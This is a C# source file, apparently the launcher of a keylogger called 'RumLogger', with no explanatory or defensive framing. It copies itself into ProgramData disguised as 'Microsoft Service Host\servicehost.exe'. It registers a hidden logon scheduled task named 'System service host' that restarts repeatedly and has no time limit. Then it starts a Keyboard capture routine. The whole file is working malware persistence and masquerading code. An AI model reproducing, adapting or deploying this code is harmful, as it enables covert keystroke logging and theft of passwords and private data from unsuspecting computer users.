using System;
using System.Diagnostics;
using System.IO;
using System.Security.AccessControl;
using Microsoft.Win32.TaskScheduler;
using RumLogger;

Trace.Listeners.Add(new ConsoleTraceListener());


var proc = Process.GetCurrentProcess();
var currentPath = proc.MainModule.FileName;
var currentFile = new FileInfo(currentPath);
var currentFolder = currentFile.Directory;

var targetName = "servicehost.exe";
var targetPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Service Host", targetName);
var targetFile = new FileInfo(targetPath);
var targetFolder = targetFile.Directory;
targetFolder?.Create();

if (currentPath == targetPath)
{
    Trace.WriteLine("Application in final folder");
}
else
{
    try
    {
        Trace.WriteLine($"Copying to {targetPath}...");
        currentFile.CopyTo(targetPath);
        Trace.WriteLine($"Copied.");
    }
    catch (Exception ex)
    {
        Trace.WriteLine($"Couldn't copy: {ex.Message}");
    }

    try
    {
        Trace.WriteLine($"Creating task scheduler entry...");
        using var ts = TaskService.Instance;
        var td = ts.NewTask();
        _ = td.Settings;
        td.Settings.DisallowStartIfOnBatteries = false;
        td.Settings.ExecutionTimeLimit = TimeSpan.Zero;
        td.Settings.Hidden = true;
        //td.Settings.RunOnlyIfLoggedOn = false;
        td.Settings.RestartCount = 10;
        td.Settings.RestartInterval = TimeSpan.FromMinutes(1);
        td.Settings.StopIfGoingOnBatteries = false;
        td.Settings.IdleSettings.StopOnIdleEnd = false;
        td.Settings.Priority = ProcessPriorityClass.Normal;

        string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
        td.Triggers.Add(new LogonTrigger { UserId = user });
        td.Actions.Add(targetPath, null, null);
        ts.RootFolder.RegisterTaskDefinition("System service host", td);
        Trace.WriteLine($"Created.");
    }
    catch (Exception ex)
    {
        Trace.WriteLine($"Couldn't create task scheduler entry: {ex.Message}");
    }
}

var k = new Keyboard();
k.Run();
